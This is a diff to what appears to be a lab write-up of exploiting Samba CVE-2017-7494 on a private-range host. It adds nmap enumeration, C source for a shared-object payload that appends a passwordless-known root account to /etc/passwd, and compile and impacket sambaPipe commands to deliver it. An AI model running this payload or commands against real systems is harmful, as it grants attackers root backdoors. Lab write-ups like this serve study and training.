@@ -10,6 +10,10 @@
 
 ![image](https://user-images.githubusercontent.com/123066149/232695163-76739356-f0f6-420a-98cf-33bd6aff143f.png)
 
+``nmap --script smb-enum-shares -p 445 10.11.1.146``
+
+![image](https://user-images.githubusercontent.com/123066149/232786031-26bada56-7b99-406c-b72c-8976fe9f061c.png)
+
 # ${{\color{purple}Initial Foothold}}\ $
 
 ``nmap --script smb-vuln-cve-2017-7494 --script-args smb-vuln-cve-2017-7494.check-version -p445 10.11.1.146``
@@ -67,7 +71,37 @@ https://redteamzone.com/EternalRed/
 
 # ${{\color{purple}Manual exploitation other way}}\ $
 
-nmap --script smb-enum-shares -p 445 10.11.1.146
+### This ressource help me so hard !
+
+https://lisandre.com/archives/14153
+
+``#include <stdio.h>``
+
+``#include <stdlib.h>``
+
+``static void smash() __attribute__((constructor));``
+
+``void smash() {``
+
+   `` setresuid(0,0,0);``
+   
+    ``system("echo root2:$(openssl passwd PreciouS):0:0:root:/root:/bin/bash >> /etc/passwd");``
+    
+``}``
+
+![image](https://user-images.githubusercontent.com/123066149/232786683-1588db5d-282f-4d93-a32d-2c1f47d28db9.png)
+
+### Compile the payload :
+
+``gcc -o payload.so -shared payload.c -fPIC``
+
+``Run the exploit``
+
+``/usr/share/doc/python3-impacket/examples/sambaPipe.py -so payload.so -no-pass -port 445 $IP``
+
+![image](https://user-images.githubusercontent.com/123066149/232787267-f3b93d5f-73a1-4bd7-a61d-9deef345044b.png)
+
+
 
 # ${{\color{purple}Points of Improvement}}\ $
 
